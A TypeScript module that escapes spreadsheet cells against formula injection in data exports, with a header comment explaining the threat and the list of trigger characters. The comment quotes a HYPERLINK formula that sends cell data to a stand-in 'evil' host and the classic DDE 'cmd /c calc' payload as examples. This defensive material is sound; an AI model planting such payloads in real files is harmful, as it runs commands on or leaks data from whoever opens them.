/**
 * Spreadsheet formula injection (CLAUDE.md §5.11).
 *
 * A spreadsheet decides whether a cell is data or code by looking at its first
 * character. So a contact whose surname is `=HYPERLINK("http://evil/"&A1,"x")`
 * is stored as a harmless string, exported as a harmless string — and then
 * **executed** the moment somebody opens the file in Excel, Sheets or
 * LibreOffice. The attacker never touches our servers; the victim is whoever
 * the export is emailed to. It is the one injection where escaping at the
 * boundary is the entire defence, because the interpreter is not ours.
 *
 * The fix is one character: a leading apostrophe forces the cell to text.
 *
 * ## What counts as dangerous
 *
 * CLAUDE.md names `=`, `+`, `-`, `@`, tab and carriage return. Two notes:
 *
 *   - `-` and `+` are there because `-1+1` is arithmetic, and because
 *     `-2+3+cmd|' /c calc'!A0` is the classic DDE payload.
 *   - tab and carriage return are there because Excel strips leading
 *     whitespace before deciding, so `\t=1+1` is a formula. `\n` is added
 *     here for the same reason: it costs an apostrophe on a value that began
 *     with a blank line, and it closes the identical hole.
 *
 * ## Where it is applied
 *
 * In the writer, on **every** cell of every format, not on the columns that
 * look risky. The value that reaches an export may have come from a system
 * column, a custom field created five minutes ago, or a CSV a user imported
 * last week — and the import path is precisely how an attacker gets a string
 * of their choosing into a tenant's data in the first place. A list of
 * "fields to escape" is a list that will be out of date the next time
 * somebody adds a field, which is why there isn't one.
 */

/** The characters a spreadsheet treats as "this cell is code". */
export const FORMULA_TRIGGER_CHARACTERS: readonly string[] = ['=', '+', '-', '@', '\t', '\r', '\n'];

const TRIGGERS: ReadonlySet<string> = new Set(FORMULA_TRIGGER_CHARACTERS);

/** The prefix that forces a cell to be read as text. */
export const FORMULA_ESCAPE_PREFIX = "'";

export function startsFormula(value: string): boolean {
  const first = value.charAt(0);
  return first !== '' && TRIGGERS.has(first);
}

/**
 * Make one cell safe to open.
 *
 * Idempotent in the sense that matters: an already-escaped value starts with
 * `'`, which is not a trigger, so re-escaping leaves it alone.
 */
export function escapeSpreadsheetCell(value: string): string {
  return startsFormula(value) ? FORMULA_ESCAPE_PREFIX + value : value;
}

/**
 * The cell writer both formats share.
 *
 * `null` and `undefined` become an empty cell rather than the strings "null"
 * or "undefined". Everything else is stringified and escaped — numbers,
 * booleans and dates included, so that a future value type cannot slip past by
 * not being a string yet.
 */
export function toExportCell(value: unknown): string {
  if (value === null || value === undefined) return '';
  if (value instanceof Date) return value.toISOString();
  return escapeSpreadsheetCell(plainText(value));
}

/**
 * A value as the text a cell holds, with no decision about escaping.
 *
 * Explicit about each primitive, because `String(value)` on an `unknown` is how
 * an object ends up as the cell `[object Object]` — or, worse, how a type that
 * is added later is quietly stringified one way in one writer and another way in
 * the next.
 */
export function plainText(value: unknown): string {
  if (typeof value === 'string') return value;
  if (typeof value === 'number' || typeof value === 'boolean' || typeof value === 'bigint') {
    return String(value);
  }
  return JSON.stringify(value) ?? '';
}

/**
 * The inverse, for a file we exported coming back in.
 *
 * Our own escape is a leading apostrophe in front of a trigger character, so
 * an export round-trips: `'-1500.00 INR` becomes `-1500.00 INR` again instead
 * of failing to parse. Only that exact shape is undone — an apostrophe in front
 * of anything else (`'Neil`) is part of the data and is left alone — and the
 * result is a plain stored string that the *next* export escapes again, so
 * undoing it opens nothing.
 */
export function unescapeSpreadsheetCell(value: string): string {
  if (
    value.length > 1 &&
    value.startsWith(FORMULA_ESCAPE_PREFIX) &&
    TRIGGERS.has(value.charAt(1))
  ) {
    return value.slice(1);
  }
  return value;
}
